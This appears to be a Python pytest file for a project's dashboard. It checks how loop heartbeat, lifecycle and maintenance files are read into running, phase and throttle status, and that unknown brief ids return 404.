def test_loop_runtime_shared_disk_stale_heartbeat_reports_dead(
    mem_fs: dict[str, str],
) -> None:
    from maestro.dashboard.routes import read_loop_runtime

    config = _seed_live_loop(
        mem_fs, heartbeat_age_seconds=10_000, lifecycle=_LIVE_LIFECYCLE,
    )
    runtime = read_loop_runtime(config)
    assert runtime.running is False
    assert runtime.current_phase is None
    # No ``last_shutdown``: a phase longer than the stale window may still be
    # running, so the persisted throttle timestamp is still reported.
    assert runtime.budget_throttle_entered_at == _THROTTLE_ISO
    assert runtime.budget_throttle_active is True


def test_loop_runtime_shared_disk_last_shutdown_reports_stopped(
    mem_fs: dict[str, str],
) -> None:
    """A graceful shutdown reads stopped at once, even with a fresh heartbeat,
    and a stopped loop never shows as throttled."""
    from maestro.dashboard.routes import read_current_phase, read_loop_runtime

    lifecycle = json.dumps({
        "last_shutdown": _THROTTLE_ISO,
        "current_phase": "run_task",
        "budget_throttle_entered_at": _THROTTLE_ISO,
    })
    config = _seed_live_loop(mem_fs, lifecycle=lifecycle)
    runtime = read_loop_runtime(config)
    assert runtime.running is False
    assert runtime.current_phase is None
    assert runtime.budget_throttle_entered_at is None
    assert runtime.budget_throttle_active is False
    assert read_current_phase(config) is None


def test_loop_runtime_shared_disk_missing_heartbeat_reports_dead(
    mem_fs: dict[str, str],
) -> None:
    from maestro.dashboard.routes import read_loop_runtime

    config = _seed_live_loop(
        mem_fs, heartbeat_age_seconds=None, lifecycle=_LIVE_LIFECYCLE,
    )
    runtime = read_loop_runtime(config)
    assert runtime.running is False
    assert runtime.current_phase is None


def test_loop_runtime_shared_disk_naive_heartbeat_is_utc(
    mem_fs: dict[str, str],
) -> None:
    from maestro.dashboard.routes import read_loop_runtime

    config = _seed_live_loop(mem_fs, heartbeat_age_seconds=None)
    naive = datetime.now(UTC).replace(tzinfo=None).isoformat()
    mem_fs[str(FAKE_DIR / "loop.heartbeat")] = naive
    assert read_loop_runtime(config).running is True


@pytest.mark.parametrize("lifecycle", [None, "{not json", "[1, 2]"])
def test_loop_runtime_shared_disk_unreadable_lifecycle(
    mem_fs: dict[str, str], lifecycle: str | None,
) -> None:
    """A fresh heartbeat with a missing/malformed/non-dict lifecycle: running,
    but no phase or throttle is reported."""
    from maestro.dashboard.routes import read_loop_runtime

    config = _seed_live_loop(mem_fs, lifecycle=lifecycle)
    runtime = read_loop_runtime(config)
    assert runtime.running is True
    assert runtime.current_phase is None
    assert runtime.budget_throttle_entered_at is None
    assert runtime.budget_throttle_active is False


def test_loop_runtime_shared_disk_non_string_fields_ignored(
    mem_fs: dict[str, str],
) -> None:
    from maestro.dashboard.routes import read_loop_runtime

    config = _seed_live_loop(
        mem_fs,
        lifecycle=json.dumps({"current_phase": 3, "budget_throttle_entered_at": 7}),
    )
    runtime = read_loop_runtime(config)
    assert runtime.current_phase is None
    assert runtime.budget_throttle_entered_at is None


@pytest.mark.parametrize(
    "maintenance", ["{broken", "[true]", '{"active": "yes"}'],
)
def test_loop_runtime_shared_disk_malformed_sidecar_is_inactive(
    mem_fs: dict[str, str], maintenance: str,
) -> None:
    from maestro.dashboard.routes import read_loop_runtime

    config = _seed_live_loop(mem_fs, maintenance=maintenance)
    assert read_loop_runtime(config).maintenance_mode_active is False


def test_loop_runtime_shared_disk_maintenance_only_throttles(
    mem_fs: dict[str, str],
) -> None:
    """Maintenance is persistent operator intent: reported (and throttling)
    even with no throttle timestamp and a dead loop."""
    from maestro.dashboard.routes import read_loop_runtime

    config = _seed_live_loop(
        mem_fs, heartbeat_age_seconds=None, maintenance='{"active": true}',
    )
    runtime = read_loop_runtime(config)
    assert runtime.maintenance_mode_active is True
    assert runtime.budget_throttle_active is True



async def _post(app: Any, path: str, **kw: Any) -> Any:
    async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test") as c:
        return await c.post(path, **kw)


@pytest.mark.asyncio
@pytest.mark.parametrize(
    ("path", "kw"),
    [("/api/briefs/brief-x/pursue", {}), ("/api/briefs/brief-x/kill", {"json": {}})],
)
async def test_brief_decision_unknown_id_is_404(
    mem_fs: dict[str, str], path: str, kw: dict[str, Any],
) -> None:
    app, _ = _make_app(mem_fs)
    r = await _post(app, path, **kw)
    assert r.status_code == 404



